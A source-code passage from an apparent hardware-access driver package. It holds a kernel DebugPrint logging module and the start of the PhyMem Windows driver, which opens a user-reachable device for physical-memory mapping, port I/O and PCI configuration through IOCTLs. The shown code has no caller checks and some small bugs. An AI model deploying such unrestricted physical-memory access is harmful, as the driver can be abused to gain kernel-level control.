		KeSetEvent( &ThreadEvent, 0, FALSE);
		return;
	}

	DebugPrintStarted = TRUE;

	// Send event that we've started logging
	DebugPrintMsg("DebugPrint logging started");
}

//////////////////////////////////////////////////////////////////////////////
//	DebugPrintClose:	Close connection to DebugPrint
//
//	IRQL PASSIVE_LEVEL

void DebugPrintClose()
{
	if( !DebugPrintStarted) return;

	DebugPrintMsg("DebugPrint logging ended");
	DebugPrintStarted = FALSE;
	
	// Tell thread to stop, and wait for it to stop
	ExitNow = TRUE;
	KeSetEvent( &ThreadEvent, 0, FALSE);
	KeWaitForSingleObject( &ThreadExiting, Executive, KernelMode, FALSE, NULL);

	// Dereference thread object
	if( ThreadObjectPointer!=NULL)
	{
		ObDereferenceObject(&ThreadObjectPointer);
		ThreadObjectPointer = NULL;
	}
	
	// Release our copy of DriverName
	if( DriverName!=NULL)
		ExFreePool(DriverName);
//	ClearEvents();
}

//////////////////////////////////////////////////////////////////////////////
//	DebugPrintMsg:	Send message event to DebugPrint
//
//	IRQL <= DISPATCH_LEVEL

void DebugPrintMsg(char* Msg)
{
	LARGE_INTEGER Now;
	TIME_FIELDS NowTF;
	USHORT MsgLen;
	ULONG EventDataLen, len;
	PDEBUGPRINT_EVENT pEvent;

	if( !DebugPrintStarted || DriverName==NULL) return;

	// Get current time
	KeQuerySystemTime(&Now);
//	LARGE_INTEGER NowLocal;
//	ExSystemTimeToLocalTime( &Now, &NowLocal);	// NT only
//	RtlTimeToTimeFields( &NowLocal, &NowTF);
	RtlTimeToTimeFields( &Now, &NowTF);

	// Get size of Msg and complete event
	MsgLen = ANSIstrlen(Msg)+1;
	EventDataLen = sizeof(TIME_FIELDS) + DriverNameLen + MsgLen;
	len = sizeof(LIST_ENTRY)+sizeof(ULONG)+EventDataLen;

	// Allocate event buffer
	pEvent = (PDEBUGPRINT_EVENT)ExAllocatePool(NonPagedPool,len);
	if( pEvent!=NULL)
	{
		PUCHAR buffer = (PUCHAR)pEvent->EventData;
		// Copy event info to buffer
		RtlCopyMemory( buffer, &NowTF, sizeof(TIME_FIELDS));
		buffer += sizeof(TIME_FIELDS);
		RtlCopyMemory( buffer, DriverName, DriverNameLen);
		buffer += DriverNameLen;
		RtlCopyMemory( buffer, Msg, MsgLen);

		// Insert event into event list for processing by system thread
		pEvent->Len = EventDataLen;
		ExInterlockedInsertTailList(&EventList,&pEvent->ListEntry,&EventListLock);
	}
}

//////////////////////////////////////////////////////////////////////////////
//*	DebugPrintVA:	Implement DebugPrint calls

void DebugPrintVA(int max, const char* format, va_list marker)
{
	char* Msg;
	if( !DebugPrintStarted) return;
	Msg = (char*)ExAllocatePool(NonPagedPool,max);
	if( Msg==NULL)
	{
		DebugPrintMsg("DebugPrint: Could not allocate buffer");
		return;
	}
	DebugSprintf(Msg,max,format,marker);
	DebugPrintMsg(Msg);
	ExFreePool(Msg);
}
#endif // DODEBUGPRINT

//////////////////////////////////////////////////////////////////////////////
//	DebugPrint:	Formatted print to DebugPrint, allocating own print buffer
//
//	IRQL <= DISPATCH_LEVEL

void DebugPrint(const char* format, ... )
{
#if DODEBUGPRINT
	va_list marker;
	if( !DebugPrintStarted) return;
	va_start(marker,format);
	DebugPrintVA(100,format,marker);
#endif // DODEBUGPRINT
}

//////////////////////////////////////////////////////////////////////////////
//	DebugPrint:	Formatted print to DebugPrint, giving size of buffer to allocate
//
//	IRQL <= DISPATCH_LEVEL

void DebugPrint2(int max, const char* format, ... )
{
#if DODEBUGPRINT
	va_list marker;
	if( !DebugPrintStarted) return;
	va_start(marker,format);
	DebugPrintVA(max,format,marker);
#endif // DODEBUGPRINT
}

#if DODEBUGPRINT
//////////////////////////////////////////////////////////////////////////////
//	IRP Major and Minor function names

static char* IrpMajorFunctionNames[] =
{
	"IRP_MJ_CREATE",
	"IRP_MJ_CREATE_NAMED_PIPE",
	"IRP_MJ_CLOSE",
	"IRP_MJ_READ",
	"IRP_MJ_WRITE",
	"IRP_MJ_QUERY_INFORMATION",
	"IRP_MJ_SET_INFORMATION",
	"IRP_MJ_QUERY_EA",
	"IRP_MJ_SET_EA",
	"IRP_MJ_FLUSH_BUFFERS",
	"IRP_MJ_QUERY_VOLUME_INFORMATION",
	"IRP_MJ_SET_VOLUME_INFORMATION",
	"IRP_MJ_DIRECTORY_CONTROL",
	"IRP_MJ_FILE_SYSTEM_CONTROL",
	"IRP_MJ_DEVICE_CONTROL",
	"IRP_MJ_INTERNAL_DEVICE_CONTROL",
	"IRP_MJ_SHUTDOWN",
	"IRP_MJ_LOCK_CONTROL",
	"IRP_MJ_CLEANUP",
	"IRP_MJ_CREATE_MAILSLOT",
	"IRP_MJ_QUERY_SECURITY",
	"IRP_MJ_SET_SECURITY",
	"IRP_MJ_POWER",
	"IRP_MJ_SYSTEM_CONTROL",
	"IRP_MJ_DEVICE_CHANGE",
	"IRP_MJ_QUERY_QUOTA",
	"IRP_MJ_SET_QUOTA",
	"IRP_MJ_PNP",
};
static ULONG NUM_IrpMajorFunctionNames = sizeof(IrpMajorFunctionNames)/sizeof(char*);

static char* PnPIrpMinorFunctionNames[] =
{
	"IRP_MN_START_DEVICE",
	"IRP_MN_QUERY_REMOVE_DEVICE",
	"IRP_MN_REMOVE_DEVICE",
	"IRP_MN_CANCEL_REMOVE_DEVICE",
	"IRP_MN_STOP_DEVICE",
	"IRP_MN_QUERY_STOP_DEVICE",
	"IRP_MN_CANCEL_STOP_DEVICE",
	"IRP_MN_QUERY_DEVICE_RELATIONS",
	"IRP_MN_QUERY_INTERFACE",
	"IRP_MN_QUERY_CAPABILITIES",
	"IRP_MN_QUERY_RESOURCES",
	"IRP_MN_QUERY_RESOURCE_REQUIREMENTS",
	"IRP_MN_QUERY_DEVICE_TEXT",
	"IRP_MN_FILTER_RESOURCE_REQUIREMENTS",
	"Nowt",
	"IRP_MN_READ_CONFIG",
	"IRP_MN_WRITE_CONFIG",
	"IRP_MN_EJECT",
	"IRP_MN_SET_LOCK",
	"IRP_MN_QUERY_ID",
	"IRP_MN_QUERY_PNP_DEVICE_STATE",
	"IRP_MN_QUERY_BUS_INFORMATION",
	"IRP_MN_DEVICE_USAGE_NOTIFICATION",
	"IRP_MN_SURPRISE_REMOVAL",
	"IRP_MN_QUERY_LEGACY_BUS_INFORMATION",
};
static ULONG NUM_PnPIrpMinorFunctionNames = sizeof(PnPIrpMinorFunctionNames)/sizeof(char*);

static char* PowerIrpMinorFunctionNames[] =
{
	"IRP_MN_WAIT_WAKE",
	"IRP_MN_POWER_SEQUENCE",
	"IRP_MN_SET_POWER",
	"IRP_MN_QUERY_POWER",
};
static ULONG NUM_PowerIrpMinorFunctionNames = sizeof(PowerIrpMinorFunctionNames)/sizeof(char*);

static char* WMIIrpMinorFunctionNames[] =
{
	"IRP_MN_QUERY_ALL_DATA",
	"IRP_MN_QUERY_SINGLE_INSTANCE",
	"IRP_MN_CHANGE_SINGLE_INSTANCE",
	"IRP_MN_CHANGE_SINGLE_ITEM",
	"IRP_MN_ENABLE_EVENTS",
	"IRP_MN_DISABLE_EVENTS",
	"IRP_MN_ENABLE_COLLECTION",
	"IRP_MN_DISABLE_COLLECTION",
	"IRP_MN_REGINFO",
	"IRP_MN_EXECUTE_METHOD",
};
static ULONG NUM_WMIIrpMinorFunctionNames = sizeof(WMIIrpMinorFunctionNames)/sizeof(char*);

static char* PowerSystemStates[] =
{
    "PowerSystemUnspecified",
    "PowerSystemWorking",
    "PowerSystemSleeping1",
    "PowerSystemSleeping2",
    "PowerSystemSleeping3",
    "PowerSystemHibernate",
    "PowerSystemShutdown",
};
static int NUM_PowerSystemStates = sizeof(PowerSystemStates)/sizeof(char*);

static char* PowerDeviceStates[] =
{
    "PowerDeviceUnspecified",
    "PowerDeviceD0",
    "PowerDeviceD1",
    "PowerDeviceD2",
    "PowerDeviceD3",
};
static int NUM_PowerDeviceStates = sizeof(PowerDeviceStates)/sizeof(char*);

/////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////
//*	All these PrintXxx routines return TRUE if the buffer is filled
//*	Safe way to put a character in a buffer

#define PHDput(ch) if( (*pbufpos)>=max) return TRUE; else buffer[(*pbufpos)++] = (ch)

/////////////////////////////////////////////////////////////////////////////
//	Digits for decimal and hex conversions

static char hexdigits[] = "0123456789ABCDEF";

/////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////

BOOLEAN PrintChar( char* buffer, int max, int* pbufpos, char ch)
{
	PHDput(ch);
	return FALSE;
}

/////////////////////////////////////////////////////////////////////////////

BOOLEAN PrintULONG( char* buffer, int max, int* pbufpos, ULONG v)
{
	int digits;
	ULONG v2;
	int digno;

	if( v==0)
	{
		PHDput('0');
		return FALSE;
	}
	// Get number of digits
	digits = 0;
	v2 = v;
	while(v2!=0)
	{
		v2 /= 10;
		digits++;
	}
	// Write out
	(*pbufpos) += digits;
	for( digno=1;digno<=digits;digno++)
	{
		char ch = hexdigits[v%10];
		if( (*pbufpos)-digno<max) buffer[(*pbufpos)-digno] = ch;
		v /= 10;
	}
	return FALSE;
}

/////////////////////////////////////////////////////////////////////////////

BOOLEAN PrintInt( char* buffer, int max, int* pbufpos, int v)
{
	if( v<0)
	{
		PHDput('-');
		v = -v;
	}
	return PrintULONG( buffer, max, pbufpos, v);
}

/////////////////////////////////////////////////////////////////////////////

BOOLEAN PrintULONG64( char* buffer, int max, int* pbufpos, unsigned __int64 v)
{
	int digits;
	unsigned __int64 v2;
	int digno;

	if( v==0)
	{
		PHDput('0');
		return FALSE;
	}
	// Get number of digits
	digits = 0;
	v2 = v;
	while(v2!=0)
	{
		v2 /= 10;
		digits++;
	}
	// Write out
	(*pbufpos) += digits;
	for( digno=1;digno<=digits;digno++)
	{
		char ch = hexdigits[v%10];
		if( (*pbufpos)-digno<max) buffer[(*pbufpos)-digno] = ch;
		v /= 10;
	}
	return FALSE;
}

/////////////////////////////////////////////////////////////////////////////

BOOLEAN PrintInt64( char* buffer, int max, int* pbufpos, __int64 v)
{
	if( v<0)
	{
		PHDput('-');
		v = -v;
	}
	return PrintULONG64( buffer, max, pbufpos, v);
}

/////////////////////////////////////////////////////////////////////////////

BOOLEAN PrintULONGhex( char* buffer, int max, int* pbufpos, ULONG v, int FormatSize)
{
	ULONG mask = 0xF0000000;
	int shift = 28;
	int digno;
	if( FormatSize>0 && FormatSize<8)
	{
		mask >>= 4*(8-FormatSize);
		shift -= 4*(8-FormatSize);
	}
	else
		FormatSize = 8;
	for( digno=0;digno<FormatSize;digno++)
	{
		int digit = (v&mask)>>shift;
		PHDput(hexdigits[digit]);
		mask >>= 4;
		shift -= 4;
	}
	return FALSE;
}

/////////////////////////////////////////////////////////////////////////////

BOOLEAN PrintANSIString( char* buffer, int max, int* pbufpos, char* s, int FormatSize)
{
	char ch;
	BOOLEAN sized = (FormatSize>0);
	while( ch=*s++)
	{
		PHDput(ch);
		if( sized && (--FormatSize==0))
			break;
	}
	return FALSE;
}

/////////////////////////////////////////////////////////////////////////////

BOOLEAN PrintWideString( char* buffer, int max, int* pbufpos, wchar_t* ws, int FormatSize)
{
	wchar_t ch;
	BOOLEAN sized = (FormatSize>0);
	while( ch=*ws++)
	{
		PHDput((char)ch);
		if( sized && (--FormatSize==0))
			break;
	}
	return FALSE;
}

/////////////////////////////////////////////////////////////////////////////

BOOLEAN PrintUnicodeString( char* buffer, int max, int* pbufpos, PUNICODE_STRING pus)
{
	int uslen = (pus->Length) >> 1;
	wchar_t* ws = pus->Buffer;
	int chno;
	for( chno=0;chno<uslen;chno++)
	{
		wchar_t ch = *ws++;
		if( ch==L'\0') break;
		PHDput((char)ch);
	}

	return FALSE;
}

/////////////////////////////////////////////////////////////////////////////

BOOLEAN PrintIrp( char* buffer, int max, int* pbufpos, PIRP Irp)
{
	PIO_STACK_LOCATION IrpStack = IoGetCurrentIrpStackLocation(Irp);
	ULONG MajorFunction = IrpStack->MajorFunction;
	ULONG MinorFunction = IrpStack->MinorFunction;
	if( MajorFunction<NUM_IrpMajorFunctionNames)
	{
		char* MajorFunctionName = IrpMajorFunctionNames[MajorFunction];
		char* MinorFunctionName = NULL;
		char* ExtraDetails1 = NULL;
		char* ExtraDetails2 = NULL;

		if( PrintANSIString(buffer,max,pbufpos,MajorFunctionName,0)) return TRUE;

		switch(MajorFunction)
		{
		case Dbp_IRP_MJ_PNP:
			if( MinorFunction<NUM_PnPIrpMinorFunctionNames)
				MinorFunctionName = PnPIrpMinorFunctionNames[MinorFunction];
			else
			{
				PHDput(':');
				if( PrintULONGhex(buffer,max,pbufpos,MinorFunction,8)) return TRUE;
			}
			if( MinorFunction==Dbp_IRP_MN_QUERY_DEVICE_RELATIONS)
			{
				Dbp_PQueryDeviceRelations pQueryDeviceRelations= (Dbp_PQueryDeviceRelations)&IrpStack->Parameters.Read.Length;
				switch( pQueryDeviceRelations->Type)
				{
				case Dbp_BusRelations:			ExtraDetails1 = "BusRelations"; break;
				case Dbp_EjectionRelations:		ExtraDetails1 = "EjectionRelations"; break;
				case Dbp_PowerRelations:		ExtraDetails1 = "PowerRelations"; break;
				case Dbp_RemovalRelations:		ExtraDetails1 = "RemovalRelations"; break;
				case Dbp_TargetDeviceRelation:	ExtraDetails1 = "TargetDeviceRelation"; break;
				}
			}
			break;
		case Dbp_IRP_MJ_POWER:
			if( MinorFunction<NUM_PowerIrpMinorFunctionNames)
				MinorFunctionName = PowerIrpMinorFunctionNames[MinorFunction];
			if( MinorFunction==Dbp_IRP_MN_SET_POWER || MinorFunction==Dbp_IRP_MN_QUERY_POWER)
			{
				Dbp_PPower pPower = (Dbp_PPower)&IrpStack->Parameters.Read.Length;
				Dbp_POWER_STATE PowerState = pPower->State;
				ExtraDetails1 = (MinorFunction==Dbp_IRP_MN_SET_POWER ? "Set Power" : "Query Power");
				if( pPower->Type==Dbp_SystemPowerState)
				{
					if( PowerState.SystemState<NUM_PowerSystemStates)
						ExtraDetails2 = PowerSystemStates[PowerState.SystemState];
				}
				else
				{
					if( PowerState.DeviceState<NUM_PowerDeviceStates)
						ExtraDetails2 = PowerDeviceStates[PowerState.DeviceState];
				}
			}
			break;
		case Dbp_IRP_MJ_SYSTEM_CONTROL:
			if( MinorFunction<NUM_WMIIrpMinorFunctionNames)
				MinorFunctionName = WMIIrpMinorFunctionNames[MinorFunction];
			break;
		}
		if( MinorFunctionName!=NULL)
		{
			PHDput(':');
			if( PrintANSIString(buffer,max,pbufpos,MinorFunctionName,0)) return TRUE;
		}
		if( ExtraDetails1!=NULL)
		{
			PHDput(' ');
			if( PrintANSIString(buffer,max,pbufpos,ExtraDetails1,0)) return TRUE;
		}
		if( ExtraDetails2!=NULL)
		{
			PHDput(' ');
			if( PrintANSIString(buffer,max,pbufpos,ExtraDetails2,0)) return TRUE;
		}
	}
	return FALSE;
}

/////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////
//*	PHDsprintf:	Write formatted data to a string
//				PrintXxx routines used to do prints for each type
//				Give up as soon as end of buffer reached

#define PHD_va_arg(ap,t,v)	t v = va_arg(ap,t)

void DebugSprintf( char* buffer, int max, const char* format, va_list marker)
{
	int bufpos = 0;
	char ch;
	// Go through each format character
	while(ch=*format++)
	{
		int FormatSize = 0;
		if( ch!='%')
		{
			if( PrintChar(buffer,max,&bufpos,ch)) goto done;
			continue;
		}
		if( (ch=*format++) == '\0')
			break;
		if( ch=='*')
		{
			PHD_va_arg(marker,int,size);
			if( size>0)
				FormatSize = size;
			if( (ch=*format++) == '\0')
				break;
		}
		else if( ch>='1' && ch<='9')
		{
			FormatSize = 0;
			do
			{
				FormatSize = (FormatSize*10) + ch-'0';
				if( (ch=*format++) == '\0')
					break;
			}
			while( ch>='1' && ch<='9');
		}
		// Switch on specification character
		switch( ch)
		{
		//	ANSI char
		case 'c':
		{
			PHD_va_arg(marker,char,ch);
			if( PrintChar(buffer,max,&bufpos,ch)) goto done;
			break;
		}
		//	Wide char
		case 'C':
		{
			PHD_va_arg(marker,wchar_t,ch);
			if( PrintChar(buffer,max,&bufpos,(char)ch)) goto done;
			break;
		}
		//	Integer
		case 'd':
		case 'i':
		{
			PHD_va_arg(marker,int,i);
			if( PrintInt(buffer,max,&bufpos,i)) goto done;
			break;
		}
		//	__int64 in hex
		case 'D':
		{
			PHD_va_arg(marker,__int64,i64);
			if( PrintInt64(buffer,max,&bufpos,i64)) goto done;
			break;
		}
		//	__int64 in hex
		case 'l':
		{
			PHD_va_arg(marker,__int64,i64);
			LARGE_INTEGER li;
			li.QuadPart = i64;
			if( FormatSize==0) FormatSize=16;
			if( FormatSize>8)
			{
				if( PrintULONGhex(buffer,max,&bufpos,li.HighPart,FormatSize-8)) goto done;
			}
			if( PrintULONGhex(buffer,max,&bufpos,li.LowPart,FormatSize)) goto done;
			break;
		}
		//	LARGE_INTEGER in hex
		case 'L':
		{
			PHD_va_arg(marker,LARGE_INTEGER,li);
			if( FormatSize==0) FormatSize=16;
			if( FormatSize>8)
			{
				if( PrintULONGhex(buffer,max,&bufpos,li.HighPart,FormatSize-8)) goto done;
			}
			if( PrintULONGhex(buffer,max,&bufpos,li.LowPart,FormatSize)) goto done;
			break;
		}
		//	ULONG
		case 'u':
		{
			PHD_va_arg(marker,ULONG,uv);
			if( PrintULONG(buffer,max,&bufpos,uv)) goto done;
			break;
		}
		// ULONG as hex
		case 'x':
		{
			PHD_va_arg(marker,ULONG,uv);
			if( PrintULONGhex(buffer,max,&bufpos,uv,FormatSize)) goto done;
			break;
		}
		//	ANSI string
		case 's':
		{
			PHD_va_arg(marker,char*,s);
			if( PrintANSIString(buffer,max,&bufpos,s,FormatSize)) goto done;
			break;
		}
		//	Wide string
		case 'S':
		{
			PHD_va_arg(marker,wchar_t*,ws);
			if( PrintWideString(buffer,max,&bufpos,ws,FormatSize)) goto done;
			break;
		}
		//	PUNICODE_STRING
		case 'T':
		{
			PHD_va_arg(marker,PUNICODE_STRING,pus);
			if( PrintUnicodeString(buffer,max,&bufpos,pus)) goto done;
			break;
		}
		//	PIRP
		case 'I':
		{
			PHD_va_arg(marker,PIRP,Irp);
			if( PrintIrp(buffer,max,&bufpos,Irp)) goto done;
			break;
		}
		default:
			if( PrintChar(buffer,max,&bufpos,ch)) goto done;
		}
	}

	// NULL terminate string
	PrintChar(buffer,max,&bufpos,'\0');
done:
	// Ensure string terminated
	buffer[max-1] = '\0';
}

//////////////////////////////////////////////////////////////////////////////
//*	ANSIstrlen:	Return length of null terminated ANSI string

USHORT ANSIstrlen( char* str)
{
	USHORT len = 0;
	for(;*str++!='\0';)
		len++;
	return len;
}

/////////////////////////////////////////////////////////////////////////////
//*	DebugPrintSystemThread:
//
// Description:
//		System thread to print device events.
//		Check for events every second, and wait for ThreadEvent ExitNow
//
// IRQL:
//		<= APC_LEVEL_IRQL
//
// Arguments:
//		Context has no meaning
//
// Return Value:
//		(None)

void DebugPrintSystemThread( IN PVOID Context)
{
	HANDLE DebugPrintDeviceHandle = NULL;
	NTSTATUS status;
	LARGE_INTEGER OneSecondTimeout;
	LARGE_INTEGER ByteOffset;

	/////////////////////////////////////////////////////////////////////////
	// Lower thread priority

	KeSetPriorityThread( KeGetCurrentThread(), LOW_REALTIME_PRIORITY);

	/////////////////////////////////////////////////////////////////////////
	// Attempt to open DebugPrt driver for 5 mins

	status = OpenDebugPrintDriver( &DebugPrintDeviceHandle);
	if( !NT_SUCCESS(status) || DebugPrintDeviceHandle==NULL)
		goto exit1;
	
	/////////////////////////////////////////////////////////////////////////
	// Set up timeout and byte offset values
	
	OneSecondTimeout.QuadPart = -1i64 * 1000000i64 * 10i64;
	ByteOffset.QuadPart = 0i64;

	/////////////////////////////////////////////////////////////////////////
	// Loop waiting for events or ExitNow to go TRUE

	while(TRUE)
	{
		/////////////////////////////////////////////////////////////////////
		// Wait for a request from DebugPrintMsg or DebugPrintClose

		KeWaitForSingleObject( &ThreadEvent, Executive, KernelMode, FALSE, &OneSecondTimeout);

		/////////////////////////////////////////////////////////////////////
		//	Remove any Events from EventList and send to DebugPrint driver

		while(TRUE)
		{
			IO_STATUS_BLOCK IoStatus;
			PDEBUGPRINT_EVENT pEvent;
			ULONG EventDataLen;

			PLIST_ENTRY pListEntry = ExInterlockedRemoveHeadList( &EventList, &EventListLock);
			if( pListEntry==NULL)
				break;

			// Get event as DEBUGPRINT_EVENT
			pEvent = CONTAINING_RECORD( pListEntry, DEBUGPRINT_EVENT, ListEntry);

			// Get length of event data
			EventDataLen = pEvent->Len;

			// Send event to DebugPrint
			status = ZwWriteFile(	DebugPrintDeviceHandle, NULL, NULL, NULL,
									&IoStatus, pEvent->EventData, EventDataLen, &ByteOffset, NULL);
//			if( status!=STATUS_SUCCESS)
//				return;
//			if( IoStatus.Information != len)
//				return;

			// Free our event buffer
			ExFreePool(pEvent);
		}

		/////////////////////////////////////////////////////////////////////
		// DebugPrintClose called, so stop the thread now.

		if( ExitNow)
			break;
	}

	/////////////////////////////////////////////////////////////////////////
	// Tidy up and terminate thread
	ZwClose(DebugPrintDeviceHandle);
exit1:
	DebugPrintStarted = FALSE;
	ClearEvents();
	KeSetEvent( &ThreadExiting, 0, FALSE);
	PsTerminateSystemThread(STATUS_SUCCESS);
}

//////////////////////////////////////////////////////////////////////////////
//*	OpenDebugPrintDriver:	Attempt to open DebugPrt driver for 5 mins
//							Try opening every 20 seconds.
//							This gives DebugPrt time to start at boot time

NTSTATUS OpenDebugPrintDriver( HANDLE* pDebugPrintDeviceHandle)
{
	NTSTATUS status;
	UNICODE_STRING DebugPrintName;
	OBJECT_ATTRIBUTES ObjectAttributes;
	IO_STATUS_BLOCK IoStatus;
	LARGE_INTEGER OneSecondTimeout;
	int DelaySeconds = 0;

	// Set up timeout
	OneSecondTimeout.QuadPart = -1i64 * 1000000i64 * 10i64;

	// Make DebugPrint device name as UNICODE_STRING
	RtlInitUnicodeString( &DebugPrintName, L"\\Device\\PHDDebugPrint");

	// Make appropriate ObjectAttributes for ZwCreateFile
	InitializeObjectAttributes( &ObjectAttributes, &DebugPrintName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	//////////////////////////////////////////////////////////////////////////
	// Attempt to open DebugPrt handle for 5 minutes

	while( DelaySeconds<5*60)
	{
		int Delay;

		//////////////////////////////////////////////////////////////////////
		// Open handle to DebugPrint device

		status = ZwCreateFile( pDebugPrintDeviceHandle,
			GENERIC_READ | GENERIC_WRITE,
			&ObjectAttributes,
			&IoStatus,
			0, // alloc size = none
			FILE_ATTRIBUTE_NORMAL,
			FILE_SHARE_READ|FILE_SHARE_WRITE,
			FILE_OPEN,
			0,
			NULL,  // eabuffer
			0 );   // ealength

		if( NT_SUCCESS(status) && *pDebugPrintDeviceHandle!=NULL)
			return status;

		//////////////////////////////////////////////////////////////////////
		// Wait for 20 seconds.

		for( Delay=20; Delay>0; Delay--)
		{
			KeWaitForSingleObject( &ThreadEvent, Executive, KernelMode, FALSE, &OneSecondTimeout);
			if( ExitNow)
				return status;
			DelaySeconds++;
		}
	}
	return status;
}

//////////////////////////////////////////////////////////////////////////////
//*	ClearEvents:	Clear any remaining events

void ClearEvents()
{
	while(TRUE)
	{
		PDEBUGPRINT_EVENT pEvent;
		PLIST_ENTRY pListEntry = ExInterlockedRemoveHeadList( &EventList, &EventListLock);
		if( pListEntry==NULL)
			break;
		pEvent = CONTAINING_RECORD( pListEntry, DEBUGPRINT_EVENT, ListEntry);
		ExFreePool(pEvent);
	}
}
//////////////////////////////////////////////////////////////////////////////

#endif  // DODEBUGPRINT

```

`source/WormholeDrivers/PHYMEM/PhyMem/driver/DebugPrint.h`:

```h
//////////////////////////////////////////////////////////////////////////////
//	Copyright © 1998,1999 PHD Computer Consultants Ltd
//	DebugPrint code header to add to a test driver
//
/////////////////////////////////////////////////////////////////////////////

#ifdef __cplusplus
extern "C"
{
#endif

#define DEBUGPRINT 0	// Set to 1 to do DebugPrints in free version

/////////////////////////////////////////////////////////////////////////////

#if DBG || DEBUGPRINT
#define DODEBUGPRINT 1
#else
#define DODEBUGPRINT 0
#endif

#if DODEBUGPRINT

void DebugPrintInit(char*);
void DebugPrintClose();
void DebugPrintMsg(char*);

#else

#define DebugPrintInit(x)
#define DebugPrintClose()
#define DebugPrintMsg(x)

#endif

void DebugPrint2(int max, const char *format, ... );
void DebugPrint(const char *format, ... );

/////////////////////////////////////////////////////////////////////////////

#ifdef __cplusplus
}
#endif

/////////////////////////////////////////////////////////////////////////////

```

`source/WormholeDrivers/PHYMEM/PhyMem/driver/phymem.c`:

```c
/*++
PhyMem Driver
Ver: 1.0
Author: akui
Date: 2009/3/2
--*/

#include <ntddk.h>
#include "phymem.h"
#include "DebugPrint.h"

//Mapped memory information list
typedef struct tagMAPINFO
{
	SINGLE_LIST_ENTRY	link;
	PMDL				pMdl;	//allocated mdl
	PVOID				pvk;	//kernel mode virtual address
	PVOID				pvu;	//user mode virtual address
	ULONG				memSize;//memory size in bytes
} MAPINFO, *PMAPINFO;

SINGLE_LIST_ENTRY lstMapInfo;	//mapped memory information
PFILE_OBJECT pcifo=NULL;		//pci bus filter driver file object
PDEVICE_OBJECT pcifido=NULL;	//pci bus filter driver device object
PPCI_BUS_INTERFACE_STANDARD busInterface=NULL;	//pci driver interface

//forward function declaration
NTSTATUS PhyMemCreate(IN PDEVICE_OBJECT fdo, IN PIRP irp);
NTSTATUS PhyMemClose(IN PDEVICE_OBJECT fdo, IN PIRP irp);
NTSTATUS PhyMemIoCtl(IN PDEVICE_OBJECT fdo, IN PIRP irp);
VOID PhyMemUnload(IN PDRIVER_OBJECT dro);

NTSTATUS GetBusInterface(IN PDEVICE_OBJECT pcifido,
	OUT PPCI_BUS_INTERFACE_STANDARD	busInterface);

//local functions
static NTSTATUS PreGetBus();
static NTSTATUS ReadWriteConfig(PIRP irp, PPHYMEM_PCI pPci, BOOLEAN isRead);


/*++
DriverEntry routine
--*/
NTSTATUS DriverEntry (IN PDRIVER_OBJECT DriverObject,
					  IN PUNICODE_STRING RegistryPath)
{
	UNICODE_STRING DeviceNameU;
	UNICODE_STRING DeviceLinkU;
	NTSTATUS ntStatus;
	PDEVICE_OBJECT fdo=NULL;

	UNREFERENCED_PARAMETER(RegistryPath);

	DebugPrintInit("PhyMem");
	DebugPrintMsg("Entering DriverEntry");

	lstMapInfo.Next=NULL;

	//initialize pci bus interface buffer
	busInterface=(PPCI_BUS_INTERFACE_STANDARD)ExAllocatePool(NonPagedPool,
		sizeof(PCI_BUS_INTERFACE_STANDARD));
	if (busInterface==NULL)
	{
		return STATUS_INSUFFICIENT_RESOURCES;
	}
	RtlZeroMemory(busInterface, sizeof(PCI_BUS_INTERFACE_STANDARD));

	RtlInitUnicodeString(&DeviceNameU, L"\\Device\\PhyMem");

	//Create an EXCLUSIVE device object
	ntStatus=IoCreateDevice(DriverObject,		//IN: Driver Object
							0,					//IN: Device Extension Size
							&DeviceNameU,		//IN: Device Name
							FILE_DEVICE_PHYMEM,	//IN: Device Type
							0,					//IN: Device Characteristics
							TRUE,				//IN: Exclusive
							&fdo);				//OUT:Created Device Object

	if (NT_SUCCESS(ntStatus))
	{
		if (NT_SUCCESS(ntStatus))
		{
			//Dispatch functions
			DriverObject->MajorFunction[IRP_MJ_CREATE]=PhyMemCreate;
			DriverObject->MajorFunction[IRP_MJ_CLOSE]=PhyMemClose;
			DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL]=PhyMemIoCtl;
			DriverObject->DriverUnload=PhyMemUnload;

			//Create a symbolic link
			RtlInitUnicodeString(&DeviceLinkU, L"\\DosDevices\\PhyMem");
			ntStatus=IoCreateSymbolicLink(&DeviceLinkU, &DeviceNameU);

			if (!NT_SUCCESS(ntStatus))
			{
				DebugPrintMsg("Error: IoCreateSymbolicLink failed");

				IoDeleteDevice(fdo);
			}
		}
		else
		{
			DebugPrintMsg("Error: IoGetDeviceObjectPointer failed");

			IoDeleteDevice(fdo);
		}
	}
	else
		DebugPrintMsg("Error: IoCreateDevice failed");

	DebugPrintMsg("Leaving DriverEntry");

	return ntStatus;
}

/*++
IRP_MJ_CREATE dispatch routine
--*/
NTSTATUS PhyMemCreate(IN PDEVICE_OBJECT fdo, IN PIRP irp)
{
	UNREFERENCED_PARAMETER(fdo);

	irp->IoStatus.Status=STATUS_SUCCESS;
	irp->IoStatus.Information=0;

	IoCompleteRequest(irp, IO_NO_INCREMENT);

	DebugPrintMsg("IRP_MJ_CREATE");

	return STATUS_SUCCESS;
}

/*++
IRP_MJ_CLOSE dispatch routine
--*/
NTSTATUS PhyMemClose(IN PDEVICE_OBJECT fdo, IN PIRP irp)
{
	UNREFERENCED_PARAMETER(fdo);

	irp->IoStatus.Status=STATUS_SUCCESS;
	irp->IoStatus.Information=0;

	IoCompleteRequest(irp, IO_NO_INCREMENT);

	DebugPrintMsg("IRP_MJ_CLOSE");

	return STATUS_SUCCESS;
}

/*++
IRP_MJ_DEVICE_CONTROL dispatch routine
--*/
NTSTATUS PhyMemIoCtl(IN PDEVICE_OBJECT fdo, IN PIRP irp)
{
	PIO_STACK_LOCATION irpStack;
	ULONG dwInBufLen;
	ULONG dwOutBufLen;
	ULONG dwIoCtlCode;
	NTSTATUS ntStatus;
	PVOID pSysBuf;
	PPHYMEM_MEM pMem;
	PPHYMEM_PORT pPort;
	PPHYMEM_PCI pPci;

	DebugPrintMsg("Entering PhyMemIoCtl");

	//Init to default settings
	irp->IoStatus.Status=STATUS_SUCCESS;
	irp->IoStatus.Information=0;

	irpStack=IoGetCurrentIrpStackLocation(irp);

	//Get the pointer to the input/output buffer and it's length
	pSysBuf=(PVOID)irp->AssociatedIrp.SystemBuffer;
	pMem=(PPHYMEM_MEM)pSysBuf;
	pPort=(PPHYMEM_PORT)pSysBuf;
